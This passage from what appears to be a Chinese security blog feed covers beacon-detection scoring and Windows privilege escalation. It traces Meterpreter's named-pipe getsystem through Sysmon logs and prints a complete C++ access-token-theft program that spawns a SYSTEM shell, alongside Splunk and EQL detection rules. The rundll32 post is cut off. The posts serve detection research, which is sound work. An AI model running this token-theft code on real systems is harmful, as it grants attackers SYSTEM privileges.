<span class="hljs-keyword">and</span> x[<span class="hljs-string">&#x27;dsMid&#x27;</span>] != x[<span class="hljs-string">&#x27;dsLow&#x27;</span>] <span class="hljs-keyword">and</span> x[<span class="hljs-string">&#x27;dsMid&#x27;</span>] != x[<span class="hljs-string">&#x27;dsHigh&#x27;</span>] <span class="hljs-keyword">else</span> <span class="hljs-number">0.0</span>, axis=<span class="hljs-number">1</span><br>    )<br><span class="hljs-comment"># 计算 dsSkewScore</span><br>http_df[<span class="hljs-string">&#x27;dsSkewScore&#x27;</span>] = <span class="hljs-number">1.0</span> - <span class="hljs-built_in">abs</span>(http_df[<span class="hljs-string">&#x27;dsSkew&#x27;</span>])<br><span class="hljs-comment"># 计算 dsMadmScore</span><br>http_df[<span class="hljs-string">&#x27;dsMadm&#x27;</span>] = http_df[<span class="hljs-string">&#x27;size_deltas&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: np.median(np.absolute(np.array(x) - np.median(np.array(x)))))<br>http_df[<span class="hljs-string">&#x27;dsMadmScore&#x27;</span>] = <span class="hljs-number">1.0</span> - http_df[<span class="hljs-string">&#x27;dsMadm&#x27;</span>] / <span class="hljs-number">32.0</span><br>http_df[<span class="hljs-string">&#x27;dsMadmScore&#x27;</span>] = http_df[<span class="hljs-string">&#x27;dsMadmScore&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> x)<br><span class="hljs-comment"># 计算 dsSmallnessScore</span><br>http_df[<span class="hljs-string">&#x27;dsSmallnessScore&#x27;</span>] = http_df[data_size].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-number">1</span>- (np.argmax(np.bincount(x)) / <span class="hljs-number">65535</span>))<br>http_df[<span class="hljs-string">&#x27;dsSmallnessScore&#x27;</span>] = http_df[<span class="hljs-string">&#x27;dsSmallnessScore&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> x)<br></code></pre></td></tr></table></figure><p>最后得到，dsScore &#x3D; (dsSkewScore + dsMADMScore + dsSmallnessScore) &#x2F; 3.0</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>最终得分：score &#x3D; (tsScore + tsScore) &#x2F; 2.0，完整的演示代码放在 <a href="https://github.com/Moofeng/DemoCode/blob/main/rita.py">这里</a></p><p>为了简单演示下狩猎效果，我用 <a href="https://github.com/cobbr/Covenant">Covenant</a> 作为 C2 框架，生成 3 组数据，通信间隔在 10-60 秒不等，抖动在 10%-20% 之间</p><p><img src="https://photo.moofeng.cn/typora/image-20220117214138280.png" alt="image-20220117214138280"></p><p>最后得分如下：</p><p><img src="https://photo.moofeng.cn/typora/image-20220117214016417.png" alt="image-20220117214016417"></p><p>当然，这里只是为了验证该算法基本逻辑的正确性，数据样本太小，并不能说明其实际使用效果，<strong>切勿直接用作检测告警</strong></p><p><strong>它的目的是帮助我们提高威胁狩猎的效率，搭配其它工具和方法一起使用才是正确的姿势</strong></p><p>例如可以<strong>将其输出作为我们检测规则的输入</strong>，或者<strong>结合威胁情报食用</strong>，进行二次确认</p><p>另外，不要忘了对输入数据做好预处理和清洗工作，比如<strong>聚焦特定协议</strong>，<strong>判断内外网IP</strong>，<strong>过滤白名单主机</strong>等等，这会大幅提高分析效率和检测效果</p><p>当然，算法本身还有很大的优化空间，尤其对计算过程中涉及到的一些常量，我也有不少的疑问</p><p>例如，Mehmet Ergene 在其<a href="https://posts.bluraven.io/implementing-rita-using-kql-8ccb0ee8eeae">文章</a>中提到过可能会产生的漏报：</p><ol><li>通信间隔的 MADM 大于 30 秒时，则 tsMADMScore 分数为 0</li><li>数据大小的 MADM 超过 32 字节时，则 dsMADMScore分数为 0</li></ol><p>如果一个 beacon 的通信间隔为 10 分钟，抖动(jitter)为 20%，其 MADM 会超过 30s</p><p>这种情况下算出的 tsMadmScore 为 0，进而会降低总得分，导致漏报</p><p>最后，感谢 <a href="https://twitter.com/Cyb3rMonk">Mehmet Ergene</a> 的分享，这篇文章受其启发而来，如有纰漏之处，欢迎私信交流</p>]]></content>
    
    
    <categories>
      
      <category>威胁狩猎</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>走进Windows中的提权行为</title>
    <link href="/posts/904709728/"/>
    <url>/posts/904709728/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 <a href="https://blog.moofeng.cn/wei-xie-shou-lie/ji-yu-yi-chang-hang-wei-jian-ce-cobaltstrike#privilege-escalation">《基于异常行为检测CobaltStrike》</a> 一文里，简单提及过 CobaltStrike 的提权方式，当时受限于篇幅，没有深入研究</p><p>最近看了几篇文章，结合对一些数据源的思考，想在这里汇总下部分常见提权手法的攻击原理和检测技巧</p><p>本文主要关注 GetSystem 的过程，对应 ATT&amp;CK 攻击框架中的 <a href="https://attack.mitre.org/techniques/T1134/">T1134 - Access Token Manipulation</a>，不涉及 UAC bypass</p><p>因为相关名词较多，例如 logon session 和 access token，过程理解可能需要一定的前置知识</p><p>这些都写进来怕显得文章又臭又长，以后有精力再另起一篇总结下知识背景吧</p><p>以下主要选择两种技术对象作为演示实例—— <strong>命名管道提权</strong> 和 <strong>访问令牌窃取</strong></p><h1 id="命名管道提权"><a href="#命名管道提权" class="headerlink" title="命名管道提权"></a>命名管道提权</h1><p>还是从最经典的 meterpreter 中的 getsystem 命令讲起，因为有 <a href="https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/namedpipe.c">源码</a> 可供参考，更方便读者理解</p><p>其代码注释中也简单解释了下工作原理和前置条件：</p><blockquote><p>Elevate from local admin to local system via Named Pipe Impersonation. </p><p>We spawn a cmd.exe under local  system which then connects to our named pipe and we impersonate this client. </p><p>This can be done by an Administrator without the need for     .  </p><p>Works on 2000, XP, 2003 and 2008 for all local administrators. On Vista and 7 it will only work if the host process has been elevated through UAC first. Does not work on NT4.</p></blockquote><p>该技术的核心在于对 <strong>ImpersonateNamedPipeClient</strong> API 的利用，通过命名管道的服务端进程模仿客户端进程的访问令牌，获取 SYSTEM 权限</p><p>关于该 API 的详细说明，具体内容可以参考 <a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient">官方文档</a></p><p>当然，想调用它，前提是进程具备 SeImpersonatePrivilege 的权限，而这通常意味着我们已经是 Admin 用户了</p><p><img src="http://photo.moofeng.cn/typora/image-20220105154303792.png" alt="image-20220105154303792"></p><p>对照源代码，我大致拆解了下该模块具体的实现步骤：</p><ol><li>getsystem 新建一个线程创建命名管道并等待服务发来的连接 (服务端)</li><li>getsystem 创建了一个以 SYSTEM 权限运行的 Windows 服务，该服务会向命名管道发起连接 (客户端)</li><li>启动该服务，向目标命名管道发起连接 (客户端 -&gt; 服务端)</li><li>该进程(服务端)接收连接，调用 ImpersonateNamedPipeClient，从而模仿了 SYSTEM 权限的访问令牌</li><li>完成提权过程后，停止并删除该服务</li></ol><p>先简单的复现一下，然后让我们去日志中一一验证 getsystem 的行为轨迹</p><p><img src="https://photo.moofeng.cn/typora/image-20220111152102728.png" alt="image-20220111152102728"></p><h2 id="第一步：创建命名管道"><a href="#第一步：创建命名管道" class="headerlink" title="第一步：创建命名管道"></a>第一步：创建命名管道</h2><p>这一步在 sysmon 中有对应的 EID 17 (Pipe Created) 日志记录，很容易就能观测到</p><p><img src="https://photo.moofeng.cn/typora/image-20220111154635530.png" alt="image-20220111154635530"></p><p>另外，在时间节点附近，结合该进程对应的 Guid 我们还能看到它更多的动作，文中后半部分有所演示</p><h2 id="第二步：创建服务"><a href="#第二步：创建服务" class="headerlink" title="第二步：创建服务"></a>第二步：创建服务</h2><p>这一步我们可以借助 Windows 系统日志观测到 EID 7045 (A new service was installed in the system) 的事件发生</p><p><img src="https://photo.moofeng.cn/typora/image-20220111154934427.png" alt="image-20220111154934427"></p><p>不过我习惯了使用 sysmon，但是其日志类型中并没有涉及到 Windows 服务，那是不是就束手无策了呢？</p><p>这里需要了解一个小窍门：<strong>Windows 安装服务的时候会写入注册表的特定位置</strong></p><p>这一知识可以应用在检测 Windows 可疑服务的创建，比如注册表键值中包含 powershell 敏感命令、base64 编码、特殊路径等</p><p>那么借助以下命令，我们就能定位到这一步创建的服务名称和命令参数等信息</p><p><code>index=windows EventCode=13  TargetObject=&quot;HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath&quot;</code></p><p><img src="https://photo.moofeng.cn/typora/image-20220111155131191.png" alt="image-20220111155131191"></p><p>从上图结果中能很明显的看出，该服务启动后(此时尚未启动)会向服务端的命名管道写入数据</p><h2 id="第三步：启动服务，连接管道"><a href="#第三步：启动服务，连接管道" class="headerlink" title="第三步：启动服务，连接管道"></a>第三步：启动服务，连接管道</h2><p>关于 Windows 服务的启动，这里有个很有意思的细节</p><p>本来我还愁找不到相应的系统日志来监测服务的启动行为，但是经过多次实验后，却发现每次都会伴随着 EID 7009 (服务连接超时)的发生</p><p>这时我才留意到源码中的这行注释，突然想起来，类似 cmd.exe 这种非有效的服务，它不会向服务管理器返回信号</p><p><img src="https://photo.moofeng.cn/typora/image-20220111184553363.png" alt="image-20220111184553363"></p><p>例如，如果我们在命令行中手动创建个简易的服务，然后再看看事件管理器中的系统日志</p><p><img src="https://photo.moofeng.cn/typora/image-20220111185403757.png" alt="image-20220111185403757"></p><p>由此引起的 EID 7009，同样可以作为我们判断 getsystem 命令执行过程中启动服务的证据</p><p>而服务启动后，我们可以结合前面分析的命令行参数，检索到其触发 EID 1(Process Create) 的相应动作</p><p><img src="https://photo.moofeng.cn/typora/image-20220111160006673.png" alt="image-20220111160006673"></p><p>该命令向服务端命名管道发起连接，这一行为会被 sysmon 的 EID 18 (Pipe Connected) 记录到</p><p><img src="https://photo.moofeng.cn/typora/image-20220111155833635.png" alt="image-20220111155833635"></p><h2 id="第四步：调用-API，完成提权"><a href="#第四步：调用-API，完成提权" class="headerlink" title="第四步：调用 API，完成提权"></a>第四步：调用 API，完成提权</h2><p>API 的调用暂无对应日志记录，但是可以根据用户名(User)和进程完整性(IntegrityLevel)等字段定位到提权的结果</p><p>如果这时我们在 MSF 的控制台执行 shell 命令，可以看到一个 SYSTEM 权限的 cmd.exe 诞生，而其父进程却是非 SYSTEM 权限</p><p>这一特征也标识着整个提权行为的顺利完成，更多的原理细节和检测步骤可以参考文章后半部分的内容</p><p><img src="https://photo.moofeng.cn/typora/image-20220111160418525.png" alt="image-20220111160418525"></p><h2 id="第五步：删除服务"><a href="#第五步：删除服务" class="headerlink" title="第五步：删除服务"></a>第五步：删除服务</h2><p>最后一步容易被很多人忽视——痕迹清除，这一行为在成熟的攻击框架中做得很到位，但同时也有利于我们做行为检测分析</p><p>我也是通过分析源码才记起来加上这一检测点，从而在日志中发现了服务删除的动作</p><p><img src="https://photo.moofeng.cn/typora/image-20220111161147096.png" alt="image-20220111161147096"></p><h1 id="访问令牌窃取"><a href="#访问令牌窃取" class="headerlink" title="访问令牌窃取"></a>访问令牌窃取</h1><p>除了上面例子中使用到的 ImpersonateNamedPipeClient 之外，还有一些 Windows API 也能帮助我们完成到 SYSTEM 权限的提升</p><p>例如 ImpersonateLoggedOnUser、DuplicateTokenEx 等等</p><p><img src="http://photo.moofeng.cn/typora/1*BC5GMjHPkE3n2qLJSn-QoA.png"></p><p>以上图右边最经典的提权路线为例，我简单解释下各步骤：</p><ol><li>通过 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a> 获取 SYSTEM 权限进程的句柄</li><li>通过 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken</a> 获取该进程的访问令牌</li><li>通过 <a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex">DuplicateTokenEx</a> 函数复制该令牌</li><li>通过 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw">CreateProcessWithTokenW</a> 创建具备同样访问令牌的进程</li></ol><p>贴一段自己测试时使用的代码，参考 <a href="https://github.com/slyd0g/PrimaryTokenTheft">https://github.com/slyd0g/PrimaryTokenTheft</a> 修改而来</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> </span>&#123;<br>    <span class="hljs-comment">// Grab PID from command line argument</span><br><span class="hljs-type">char</span> *pid_c = argv[<span class="hljs-number">1</span>];<br>DWORD PID_TO_IMPERSONATE = <span class="hljs-built_in">atoi</span>(pid_c);<br>HANDLE tokenHandle = <span class="hljs-literal">NULL</span>;<br>HANDLE duplicateTokenHandle = <span class="hljs-literal">NULL</span>;<br>STARTUPINFOW startupInfo;<br>PROCESS_INFORMATION processInformation;<br><span class="hljs-type">wchar_t</span> cmdline[] = <span class="hljs-string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;startupInfo, <span class="hljs-built_in">sizeof</span>(STARTUPINFO));<br><span class="hljs-built_in">ZeroMemory</span>(&amp;processInformation, <span class="hljs-built_in">sizeof</span>(PROCESS_INFORMATION));<br>startupInfo.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFO);<br><br>HANDLE processHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, <span class="hljs-literal">true</span>, PID_TO_IMPERSONATE);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() == <span class="hljs-literal">NULL</span>)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] OpenProcess() success!\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] OpenProcess() Return Code: %i\n&quot;</span>, processHandle);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] OpenProcess() Error: %i\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>&#125;<br>BOOL getToken = <span class="hljs-built_in">OpenProcessToken</span>(processHandle, TOKEN_DUPLICATE, &amp;tokenHandle);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() == <span class="hljs-literal">NULL</span>)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] OpenProcessToken() success!\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] OpenProcessToken() Return Code: %i\n&quot;</span>, getToken);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] OpenProcessToken() Error: %i\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>&#125;<br>BOOL duplicateToken = <span class="hljs-built_in">DuplicateTokenEx</span>(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenPrimary, &amp;duplicateTokenHandle);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() == <span class="hljs-literal">NULL</span>)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] DuplicateTokenEx() success!\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] DuplicateTokenEx() Return Code: %i\n&quot;</span>, duplicateToken);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] DupicateTokenEx() Error: %i\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>&#125;<br>BOOL createProcess = <span class="hljs-built_in">CreateProcessWithTokenW</span>(duplicateTokenHandle, LOGON_WITH_PROFILE, <span class="hljs-string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;startupInfo, &amp;processInformation);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() == <span class="hljs-literal">NULL</span>)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Process spawned!\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] CreateProcessWithTokenW Return Code: %i\n&quot;</span>, createProcess);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] CreateProcessWithTokenW Error: %i\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个过程建议大家有时间的话还是自己手动操作一遍，其中有很多坑需要留意，但是对于我们加深理解很有帮助</p><p>比如我测试时发现好几次 OpenProcess() 成功了，但是 OpenProcessToken() 却报出 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-">ERROR_ACCESS_DENIED (0x5)</a></strong> 的错误</p><p>后来才知道原来是因为我不是该进程的 <strong>TOKEN_OWNER</strong></p><p><img src="https://photo.moofeng.cn/typora/image-20220111112539038.png" alt="image-20220111112539038"></p><p>另外，选择具备 SYSTEM 权限的目标时，要注意 <strong>Protected Process Light</strong> (PPL) 这个特性</p><p>受 PPL 保护的进程需要指定 <strong>PROCESS_QUERY_LIMITED_INFORMATION</strong> 权限时才能执行 OpenProcess()，不然也会报错</p><p><img src="https://photo.moofeng.cn/typora/image-20220111112752666.png" alt="image-20220111112752666"></p><p>针对该特点，也有非常典型的攻击手法，例如 winlogon.exe 具备 SYSTEM 权限但又不受该机制保护，所以经常被利用</p><p>关于上述提到所需要的进程访问权限等相关信息，更多内容可以参考 <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">这里</a></p><p>更多的实现原理和过程步骤，我就不再赘述了，感兴趣的可以根据这篇 <a href="https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b">文章</a> 逐步复现</p><p>接下来，我会根据复现结果的日志，借助 sysmon 和 splunk 完成 getsystem 过程中的细节分析</p><p><img src="https://photo.moofeng.cn/typora/image-20220111115038323.png" alt="image-20220111115038323"></p><p>首先结合前面的结论，通过对父子进程的权限继承关系进行判断，定位到相关进程主体</p><p><img src="https://photo.moofeng.cn/typora/image-20220111170426088.png" alt="image-20220111170426088"></p><p>拿到父进程的 Guid —— {534e2476-46b7-61dd-5508-000000000b00}，然后溯源其相关行为</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">index=windows (ParentProcessGuid=&quot;&#123;<span class="hljs-number">534</span>e2476-<span class="hljs-number">46</span>b7-<span class="hljs-number">61</span>dd-<span class="hljs-number">5508</span>-<span class="hljs-number">000000000</span>b00&#125;&quot; OR ProcessGuid=&quot;&#123;<span class="hljs-number">534</span>e2476-<span class="hljs-number">46</span>b7-<span class="hljs-number">61</span>dd-<span class="hljs-number">5508</span>-<span class="hljs-number">000000000</span>b00&#125;&quot; OR SourceProcessGUID=&quot;&#123;<span class="hljs-number">534</span>e2476-<span class="hljs-number">46</span>b7-<span class="hljs-number">61</span>dd-<span class="hljs-number">5508</span>-<span class="hljs-number">000000000</span>b00&#125;&quot; OR TargetProcessGuid=&quot;&#123;<span class="hljs-number">534</span>e2476-<span class="hljs-number">46</span>b7-<span class="hljs-number">61</span>dd-<span class="hljs-number">5508</span>-<span class="hljs-number">000000000</span>b00&#125;&quot;)<br></code></pre></td></tr></table></figure><p>这其中，我们能发现一条很显眼的日志，由 token.exe 向 winlogon.exe 发起的进程间访问，注意它的访问权限</p><p><img src="https://photo.moofeng.cn/typora/image-20220111172317547.png" alt="image-20220111172317547"></p><p><em>PS：sysmon 的 EID 10 中相应字段名为 ProcessGUID，而不是 ProcessGuid</em></p><p>这里对应的就是我们代码中 OpenProcess() 的过程，因为日志里 0x1400 的访问权限正是 PROCESS_QUERY_INFORMATION</p><p><img src="https://photo.moofeng.cn/typora/image-20220111172237905.png" alt="image-20220111172237905"></p><p>这条日志紧随其后的行为便是上述的 token.exe 进程创建了 SYSTEM 权限的 cmd.exe</p><p>其中的 OpenProcessToken()、DuplicateTokenEx() 等行为就不是 sysmon 的能力范围了</p><p>关于这一点，我们需要熟悉 sysmon 的日志记录原理 ——</p><p>“为了检测 ProcessAccess 类型的日志，sysmon 采用了 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/fltkernel/nf-fltkernel-fltregisterfilter">ObRegisterCallbacks</a> 注册线程、进程和桌面句柄操作的回调列表，以便任何进程尝试使用 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-ntopenprocess">OpenProcess()</a>, <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess">NtOpenProcess()</a>, NtAlpcOpenSenderProcess() 等API打开其他进程的句柄时都能够被检测到”</p><p>写到这里了想偷个懒，针对该攻击技术，我就直接引用一段国外研究员用 EQL 写的一段检测语句吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">sequence with maxspan=<span class="hljs-number">1</span>m<br>  [process where event.code : <span class="hljs-string">&quot;10&quot;</span> and<br> <span class="hljs-comment">/*</span><br><span class="hljs-comment">  GrantedAccess values in scope</span><br><span class="hljs-comment">  0x1000 - PROCESS_QUERY_LIMITED_INFORMATION - PPL</span><br><span class="hljs-comment">  0x1400 - PROCESS_QUERY_INFORMATION</span><br><span class="hljs-comment">  0x1F3FFF - PROCESS_ALL_ACCESS</span><br><span class="hljs-comment"> */</span><br>     winlog.event_data.GrantedAccess : <br>               (<span class="hljs-string">&quot;0x1000&quot;</span>, <span class="hljs-string">&quot;0x1400&quot;</span>, <span class="hljs-string">&quot;0x1F3FFF&quot;</span>) and <br>     winlog.event_data.TargetUser : <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span> and not <br>     winlog.event_data.SourceUser : <span class="hljs-string">&quot;NT AUTHORITY\\*&quot;</span> and <br>     winlog.event_data.TargetImage : <span class="hljs-string">&quot;?:\\Windows\\*.exe&quot;</span>] by process.entity_id<br> [process where event.code : <span class="hljs-string">&quot;1&quot;</span> and <br>    winlog.event_data.LogonId : <span class="hljs-string">&quot;0x3e7&quot;</span> and <br>    winlog.event_data.TerminalSessionId : <span class="hljs-string">&quot;1&quot;</span> and <br>    not winlog.event_data.ParentUser : <span class="hljs-string">&quot;NT AUTHORITY\\*&quot;</span>] by process.parent.entity_id<br></code></pre></td></tr></table></figure><p>本质上就是对前面两个检测点做关联分析，只要前面的研究功夫下到位了，这里能施展的空间才会充足</p><p>像本文中的第一个例子，分析命名管道提权的手法时，涉及的检测点比较丰富，这时在上层做复杂规则检测就会有更多可作为的地方</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>要做好威胁检测，对攻击和防御两方面的知识都得做到烂熟于心，真正做到知己知彼其实需要长时间的积累</p><p>上述分析过程主要用到 sysmon 记录日志，但涉及到 Windows API 的调用，sysmon 其实是不足以胜任的</p><p>我自己在实际分析过程中，经常遇到找不到相应日志的情况，这时如果对日志记录原理的缺乏了解，往往会无从下手</p><p>而如果缺乏对攻击原理的熟悉，经常会忽视许多潜在的检测点，更别提去追溯相应日志了</p><p>从原理出发或者是从特征溯源，对攻击行为自上而下的分析和自下而上的分析其实是缺一不可的，结合使用才是正确的姿势</p>]]></content>
    
    
    <categories>
      
      <category>安全攻防</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>揭秘rundll32中的攻防对抗</title>
    <link href="/posts/1904944821/"/>
    <url>/posts/1904944821/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>要做好检测能力，必须得熟悉你的系统环境，只有足够了解正常行为，才能真正找出异常(Anomaly)和威胁(Threat)</p><p>在<a href="https://www.anquanke.com/post/id/262742">上篇文章</a>中介绍 CS 的一些行为特征时，经常提及 rundll32.exe，哪怕非安全人员，可能对该进程都不陌生</p><p>顾名思义，rundll32.exe 可用于执行 DLL 文件，也能调用该文件中的内部函数</p><p>它的历史差不多能追溯到 Windows 95，几乎是所有 Windows 操作系统的必需组件，不能轻易地被禁用</p><p>攻击者可以借助 rundll32.exe 加载 DLL 文件中的恶意代码，避免像其它 EXE 文件一样直接在进程树中现行</p><p>另外，攻击者还可能滥用合法 DLL 文件中的导出函数，比如待会儿就会介绍到的 comsvcs.dll 和 MiniDump</p><p>除了加载 DLL 文件，rundll32.exe 还能通过 RunHtmlApplication 函数执行 JavaScript</p><p>正因为这些特性，rundll32.exe 很容易博得攻击者的青睐，在攻击技术流行度中常常名列前茅</p><img src="http://photo.moofeng.cn/typora/image-20211208115813167.png" alt="image-20211208115813167" style="zoom:50%;" /><h3 id="常用场景"><a href="#常用场景" class="headerlink" title="常用场景"></a>常用场景</h3><p>对于 rundll32.exe，最简单粗暴的用法当然是直接指定文件名称，执行目标 DLL：</p><ul><li><code>rundll32.exe &lt;dllname&gt;</code></li></ul><p>当然，在我们日常使用操作系统的过程中，见得最多的可能是通过 rundll32.exe 调用某些 DLL 文件中的特定函数这一行为：</p><ul><li><code>rundll32.exe &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</code></li></ul><p>譬如，在我们右键点击某文档，选择特定的“打开方式”，然后会弹出个窗口供我们指定用于打开的应用程序，实际上就相当于在后台执行了以下命令：</p><ul><li><code>C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL &lt;file_path&gt;</code></li></ul><p>拿修改 hosts 文件举个例子，通过 WIN+R 执行以下命令，即可弹出该选择窗口：</p><ul><li><code>C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL C:\Windows\System32\drivers\etc\hosts</code></li></ul><p><img src="http://photo.moofeng.cn/typora/image-20211214212946699.png" alt="image-20211214212946699"></p><p>类似行为在我们的日志中呈现出来通常会是这么个模样：</p><p><img src="http://photo.moofeng.cn/typora/image-20211214213939297.png" alt="image-20211214213939297"></p><p>关于 shell32.dll，比较常见的函数还有 <code>Control_RunDLL</code> 和 <code>Control_RunDLLAsUser</code>，它们可以用于运行 .CPL 文件，一般主要是控制面板中的小程序</p><p>例如打开防火墙： <code>C:\WINDOWS\System32\rundll32.exe C:\WINDOWS\System32\shell32.dll,Control_RunDLL C:\WINDOWS\System32\firewall.cpl</code></p><p><img src="http://photo.moofeng.cn/typora/image-20211214213302558.png" alt="image-20211214213302558"></p><p>很显然，这里的 CPL 文件也可以被替换成恶意文件，所以一旦出现可疑的路径及文件名，我们就需要结合其它工具来检查它的合法性</p><p>关于这一攻击手法的使用细节，这篇 <a href="https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf">Paper</a> 值得一读，本文就不展开阐述了</p><p>另外附上一张<a href="https://www.tenforums.com/tutorials/77458-rundll32-commands-list-windows-10-a.html">表格</a>链接，其中包含了 Windows 10 上 rundll32.exe 可快速调用的命令清单及其功能含义</p><p>毕竟人生苦短，大家都没时间去记住那么多命令，但是不妨先 mark 一下，等到有需要时可以迅速查出其含义</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>借助 rundll32.exe 